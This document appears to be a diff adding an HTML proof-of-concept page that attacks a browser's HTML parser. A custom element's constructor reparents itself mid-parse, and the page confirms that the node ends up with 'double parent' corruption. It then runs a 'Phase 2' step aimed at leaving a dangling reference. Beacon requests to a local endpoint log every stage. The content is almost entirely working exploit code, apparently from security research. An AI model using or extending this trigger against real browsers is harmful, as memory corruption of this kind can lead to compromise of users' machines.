@@ -1,0 +1,140 @@
+<!doctype html>
+<html>
+<head><title>V415</title></head>
+<body>
+<script>
+var BQ=0;
+function B(t,b){
+  try{var x=new XMLHttpRequest();x.open('POST','/beacon/V415-'+t+'?t='+Date.now()+'&q='+(BQ++),false);x.send(b||'');}catch(e){}
+}
+B('BOOT');
+
+// Define custom element whose constructor reparents itself
+var altDiv = document.createElement('div');
+altDiv.id = 'alt-sink';
+
+var ctorCount = 0;
+var appendOK = false;
+var appendErr = null;
+var parentBefore = null;
+var parentAfter = null;
+
+class PwnElement extends HTMLElement {
+  constructor() {
+    super();
+    ctorCount++;
+    parentBefore = this.parentNode ? this.parentNode.id || this.parentNode.tagName : 'null';
+    B('CTOR-' + ctorCount + '-PBEFORE-' + parentBefore);
+    try {
+      altDiv.appendChild(this);
+      appendOK = true;
+      B('CTOR-' + ctorCount + '-REPARENT-OK');
+    } catch(e) {
+      appendErr = e.message;
+      B('CTOR-' + ctorCount + '-REPARENT-ERR-' + (e.message||'').substring(0,40));
+    }
+    parentAfter = this.parentNode ? this.parentNode.id || this.parentNode.tagName : 'null';
+    B('CTOR-' + ctorCount + '-PAFTER-' + parentAfter);
+  }
+}
+customElements.define('pwn-element', PwnElement);
+B('CE-DEFINED');
+</script>
+
+<!-- alt-sink must be in the DOM for appendChild to work -->
+<div id="alt-sink-host"></div>
+
+<!-- THE BUG TRIGGER: full document parser encounters custom element -->
+<!-- Parser will: find 'pwn-element' -> pause -> runScriptsForPausedTreeBuilder ->
+     constructElementWithFallback (runs constructor, which does altDiv.appendChild(this))
+     -> didCreateCustomOrFallbackElement -> insertCustomElement -> attachLater ->
+     executeQueuedTasks -> insert() -> ASSERT(!child->parentNode()) [STRIPPED!] ->
+     parserAppendChild -> DOUBLE PARENT -->
+<div id="orig-container"><pwn-element id="target1"></pwn-element></div>
+
+<!-- Post-parse analysis -->
+<script>
+B('POST-PARSE');
+B('CTOR-TOTAL-' + ctorCount);
+B('APPEND-' + (appendOK ? 'OK' : 'FAIL'));
+if (appendErr) B('APPEND-ERR-' + appendErr.substring(0,40));
+
+var target = document.getElementById('target1');
+var orig = document.getElementById('orig-container');
+
+B('TARGET-' + (target ? 'FOUND' : 'MISSING'));
+
+if (target) {
+  B('TARGET-PARENT-' + (target.parentNode ? (target.parentNode.id || target.parentNode.tagName) : 'NULL'));
+
+  // Walk orig's child list
+  var inOrig = false;
+  if (orig) {
+    var c = orig.firstChild;
+    while(c) {
+      if (c === target) { inOrig = true; break; }
+      c = c.nextSibling;
+    }
+  }
+
+  // Walk altDiv's child list
+  var inAlt = false;
+  var c2 = altDiv.firstChild;
+  while(c2) {
+    if (c2 === target) { inAlt = true; break; }
+    c2 = c2.nextSibling;
+  }
+
+  B('IN-ORIG-' + inOrig);
+  B('IN-ALT-' + inAlt);
+  B('ORIG-CHILDREN-' + (orig ? orig.childNodes.length : 'X'));
+  B('ALT-CHILDREN-' + altDiv.childNodes.length);
+
+  if (inOrig && inAlt) {
+    B('DOUBLE-PARENT-CONFIRMED');
+
+    // Phase 2: Exploit the corruption
+    // Clear altDiv to free element from one parent
+    // But element stays in orig's child list = dangling reference
+    try {
+      altDiv.textContent = '';
+      B('ALT-CLEARED');
+      var stillInOrig = false;
+      if (orig) {
+        var c3 = orig.firstChild;
+        while(c3) {
+          if (c3 === target) { stillInOrig = true; break; }
+          c3 = c3.nextSibling;
+        }
+      }
+      B('STILL-IN-ORIG-' + stillInOrig);
+      B('TARGET-PARENT-AFTER-CLEAR-' + (target.parentNode ? (target.parentNode.id || target.parentNode.tagName) : 'NULL'));
+    } catch(e) {
+      B('CLEAR-ERR-' + (e.message||'').substring(0,40));
+    }
+
+  } else if (inOrig && !inAlt) {
+    B('ONLY-IN-ORIG');
+    // Parser overwrote the reparent
+  } else if (!inOrig && inAlt) {
+    B('ONLY-IN-ALT');
+    // Constructor reparent stuck, parser didn't append
+    // This means the full parser DOES check parentNode somehow
+  } else {
+    B('IN-NEITHER');
+  }
+} else {
+  B('TARGET-MISSING-CHECK-ALT');
+  var c = altDiv.firstChild;
+  var found = false;
+  while(c) {
+    if (c.id === 'target1') { found = true; break; }
+    c = c.nextSibling;
+  }
+  B('IN-ALT-' + found);
+}
+
+B('DONE');
+</script>
+</body>
+</html>
